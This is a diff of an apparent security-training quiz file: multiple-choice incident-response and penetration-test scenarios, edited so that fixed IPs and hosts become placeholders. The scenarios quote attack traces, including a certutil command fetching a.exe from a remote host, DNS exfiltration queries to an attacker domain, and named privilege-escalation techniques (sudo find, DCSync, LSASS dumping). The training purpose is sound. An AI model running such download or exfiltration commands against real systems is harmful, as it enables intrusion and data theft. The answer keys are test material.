@@ -3,6 +3,12 @@
 // The score rewards how far you climb correctly, so a pasted or guessed answer
 // breaks the streak at the first real follow-up.
 //
+// Scenarios use {{kind}} placeholders (ip, intip, host, srv, svc, user, domain,
+// bucket, port, time). Each attempt fills them with fresh values (see src/vars.js)
+// so a scenario never looks identical twice and rote memorisation of specifics
+// is useless. Explanations stay concept-based (no placeholders), and the correct
+// answer never depends on the generated values.
+//
 // Each step: { label, prompt, type: 'mcq', options: [..], answer: <index>, explain }
 // chain difficulty doubles as its weight: 1 easy, 2 medium, 3 hard.
 
@@ -14,10 +20,10 @@ export const SCORE_CHAINS = [
     title: 'PowerShell on a finance workstation',
     difficulty: 3,
     scenario:
-      '2:14 AM. An EDR alert fires on FIN-WS-07, a finance workstation. The process tree:\n\n' +
+      '{{time}}. An EDR alert fires on {{host}}, a finance workstation. The process tree:\n\n' +
       'winword.exe\n' +
       ' └─ powershell.exe -enc JABzPQBOZXctT2Jq...(base64)\n' +
-      '      └─ cmd.exe /c certutil -urlcache -f http://185.22.14.9/a.exe %TEMP%\\a.exe\n' +
+      '      └─ cmd.exe /c certutil -urlcache -f http://{{ip}}/a.exe %TEMP%\\a.exe\n' +
       '           └─ a.exe\n\n' +
       'The user says they opened a supplier invoice about an hour ago.',
     steps: [
@@ -32,7 +38,7 @@ export const SCORE_CHAINS = [
           'A dropped USB device',
         ],
         answer: 1,
-        explain: 'Office (winword) spawning PowerShell right after the user opened an attachment points to a malicious macro.',
+        explain: 'Office spawning PowerShell right after the user opened an attachment points to a malicious macro.',
       },
       {
         label: 'First action',
@@ -49,7 +55,7 @@ export const SCORE_CHAINS = [
       },
       {
         label: 'Investigate',
-        prompt: 'certutil pulled a.exe from 185.22.14.9. Which single source best confirms a.exe ran and made outbound connections?',
+        prompt: 'certutil pulled a.exe from {{ip}}. Which single source best confirms a.exe ran and made outbound connections?',
         type: 'mcq',
         options: [
           'The email gateway logs',
@@ -58,20 +64,20 @@ export const SCORE_CHAINS = [
           "The firewall's allow-rule list",
         ],
         answer: 1,
-        explain: 'EDR on the host shows process execution and the outbound connections a.exe made.',
+        explain: 'EDR on the host shows process execution and the outbound connections the dropped file made.',
       },
       {
         label: 'Scope',
-        prompt: 'You confirm a.exe beacons to 185.22.14.9 every ~60s. Best next step to find other compromised hosts?',
+        prompt: 'You confirm a.exe beacons to {{ip}} every ~60s. Best next step to find other compromised hosts?',
         type: 'mcq',
         options: [
           "Block the user's account",
-          'Pivot on 185.22.14.9 across endpoint and proxy logs to find other hosts contacting it',
+          'Pivot on {{ip}} across endpoint and proxy logs to find other hosts contacting it',
           'Reset all finance passwords',
-          'Run antivirus on FIN-WS-07 again',
+          'Run antivirus on the one host again',
         ],
         answer: 1,
-        explain: 'The C2 IP is the pivot: any other host talking to it is likely also compromised.',
+        explain: 'The C2 address is the pivot: any other host talking to it is likely also compromised.',
       },
     ],
   },
@@ -81,7 +87,7 @@ export const SCORE_CHAINS = [
     title: 'Brute force, then a new Domain Admin',
     difficulty: 2,
     scenario:
-      '3:02 AM. A detection fires. The service account svc-backup had 240 failed logons from 10.0.44.9 in 4 minutes, then one success. Within the next 2 minutes that account created a new user "helpdesk-adm" and added it to Domain Admins.',
+      '{{time}}. A detection fires. The service account {{svc}} had 240 failed logons from {{intip}} in 4 minutes, then one success. Within the next 2 minutes that account created a new user "{{user}}-adm" and added it to Domain Admins.',
     steps: [
       {
         label: 'Orient',
@@ -101,7 +107,7 @@ export const SCORE_CHAINS = [
         prompt: 'What is the first containment step?',
         type: 'mcq',
         options: [
-          'Disable svc-backup and the new helpdesk-adm account',
+          'Disable {{svc}} and the new {{user}}-adm account',
           'Reboot the domain controller',
           'Delete the security logs',
           'Email the account owner',
@@ -129,11 +135,11 @@ export const SCORE_CHAINS = [
         options: [
           'Deeper persistence: new scheduled tasks/GPOs and possible krbtgt (Golden Ticket) exposure',
           'The two disabled accounts',
-          'The source IP 10.0.44.9',
+          'The source IP {{intip}}',
           'The failed-logon noise',
         ],
         answer: 0,
-        explain: 'With DA, the attacker may have planted persistence or stolen krbtgt; disabling two accounts does not clear that.',
+        explain: 'With Domain Admin the attacker may have planted persistence or stolen krbtgt; disabling two accounts does not clear that.',
       },
     ],
   },
@@ -145,7 +151,7 @@ export const SCORE_CHAINS = [
     title: 'Foothold on a Linux web server',
     difficulty: 2,
     scenario:
-      'You have a www-data shell on a Linux web server after a file-upload bug. `sudo -l` returns:\n\n' +
+      'You have a www-data shell on {{srv}} after a file-upload bug. `sudo -l` returns:\n\n' +
       '    (ALL) NOPASSWD: /usr/bin/find\n\n' +
       'You also notice /opt/scripts/backup.sh is world-writable and run by root via cron every minute.',
     steps: [
@@ -210,15 +216,15 @@ export const SCORE_CHAINS = [
     difficulty: 3,
     scenario:
       'On an internal test you hold a standard domain user. BloodHound shows:\n\n' +
-      'YOU → member of → IT-Support → GenericWrite over → svc-sql → member of → Server Admins → local admin on → DC01',
+      'YOU → member of → IT-Support → GenericWrite over → {{svc}} → member of → Server Admins → local admin on → {{srv}}',
     steps: [
       {
         label: 'Orient',
-        prompt: 'What does GenericWrite over svc-sql let you do?',
+        prompt: 'What does GenericWrite over {{svc}} let you do?',
         type: 'mcq',
         options: [
           'Read its current password directly',
-          'Take over svc-sql (e.g. set a fake SPN and Kerberoast, or a targeted reset)',
+          'Take over the account (e.g. set a fake SPN and Kerberoast, or a targeted reset)',
           'Delete the whole domain',
           'Nothing useful',
         ],
@@ -227,16 +233,16 @@ export const SCORE_CHAINS = [
       },
       {
         label: 'Exploit',
-        prompt: 'Having taken over svc-sql (local admin on DC01), what is the cleanest path to Domain Admin?',
+        prompt: 'Having taken over {{svc}} (local admin on {{srv}}), what is the cleanest path to Domain Admin?',
         type: 'mcq',
         options: [
-          'Dump credentials/secrets from DC01 with local admin (e.g. DCSync or LSASS)',
+          'Dump credentials/secrets from the DC with local admin (e.g. DCSync or LSASS)',
           'Phish the real administrator',
           'Brute force the Domain Admin password',
           'Wait for an admin to log in',
         ],
         answer: 0,
-        explain: 'Local admin on a DC lets you extract domain secrets directly.',
+        explain: 'Local admin on a domain controller lets you extract domain secrets directly.',
       },
       {
         label: 'Validate',
@@ -262,7 +268,7 @@ export const SCORE_CHAINS = [
           'Verbose error pages',
         ],
         answer: 0,
-        explain: 'The whole chain exists because a low-priv group can write to a privileged account.',
+        explain: 'The whole chain exists because a low-privilege group can write to a privileged account.',
       },
     ],
   },
@@ -274,9 +280,9 @@ export const SCORE_CHAINS = [
     title: 'A firewall change broke the app',
     difficulty: 2,
     scenario:
-      'After a 10:00 firewall change, users cannot reach the internal app at 10.20.0.50:443.\n' +
-      '- ping 10.20.0.50 succeeds\n' +
-      '- curl https://10.20.0.50 from a user subnet times out\n' +
+      'After a {{time}} firewall change, users cannot reach the internal app at {{intip}}:443.\n' +
+      '- ping {{intip}} succeeds\n' +
+      '- curl https://{{intip}} from a user subnet times out\n' +
       '- on the server, the service is listening on 0.0.0.0:443',
     steps: [
       {
@@ -297,7 +303,7 @@ export const SCORE_CHAINS = [
         prompt: 'Best next check to confirm?',
         type: 'mcq',
         options: [
-          'Test the port from the user subnet (e.g. nc -vz 10.20.0.50 443)',
+          'Test the port from the user subnet (e.g. nc -vz {{intip}} 443)',
           'Reboot the application',
           'Clear the browser cache',
           'Renew the certificate',
@@ -310,7 +316,7 @@ export const SCORE_CHAINS = [
         prompt: 'The change removed the allow rule for 443 from the user VLAN. Correct fix?',
         type: 'mcq',
         options: [
-          'Re-add a specific allow rule for TCP 443 from the user VLAN to 10.20.0.50',
+          'Re-add a specific allow rule for TCP 443 from the user VLAN to {{intip}}',
           'Disable the firewall',
           'Allow all traffic everywhere',
           'Move the app to port 80',
@@ -339,9 +345,9 @@ export const SCORE_CHAINS = [
     title: 'Odd DNS traffic from one host',
     difficulty: 2,
     scenario:
-      'On a span port you capture a repeating pattern from internal host 10.0.0.77:\n\n' +
-      '10.0.0.77 → resolver  DNS A  d2hhdGV2ZXI.exfil.attacker.com\n' +
-      '10.0.0.77 → resolver  DNS A  bW9yZWRhdGE.exfil.attacker.com\n' +
+      'On a span port you capture a repeating pattern from internal host {{intip}}:\n\n' +
+      '{{intip}} → resolver  DNS A  d2hhdGV2ZXI.{{domain}}\n' +
+      '{{intip}} → resolver  DNS A  bW9yZWRhdGE.{{domain}}\n' +
       '(long random-looking subdomains, every few seconds)',
     steps: [
       {
@@ -357,7 +363,7 @@ export const SCORE_CHAINS = [
         prompt: 'Which detail most supports that?',
         type: 'mcq',
         options: [
-          'Long, high-entropy, base64-like subdomains under one attacker domain at steady intervals',
+          'Long, high-entropy, base64-like subdomains under one external domain at steady intervals',
           'The queries use a public resolver',
           'The host is on an internal subnet',
           'DNS uses UDP',
@@ -370,7 +376,7 @@ export const SCORE_CHAINS = [
         prompt: 'Immediate containment?',
         type: 'mcq',
         options: [
-          'Isolate 10.0.0.77 and sinkhole/block the attacker domain',
+          'Isolate {{intip}} and sinkhole/block the external domain',
           'Reboot the DNS resolver',
           'Increase the DNS TTL',
           'Do nothing yet',
@@ -401,7 +407,7 @@ export const SCORE_CHAINS = [
     title: 'Public bucket with a leaked key',
     difficulty: 2,
     scenario:
-      "A researcher reports your S3 bucket 'acme-invoices' is publicly listable. Inside is config.env containing an AWS access key (AKIA...) and secret. CloudTrail shows that key made GetObject calls from an unfamiliar IP yesterday.",
+      "A researcher reports your S3 bucket '{{bucket}}' is publicly listable. Inside is config.env containing an AWS access key (AKIA...) and secret. CloudTrail shows that key made GetObject calls from an unfamiliar IP yesterday.",
     steps: [
       {
         label: 'Orient',
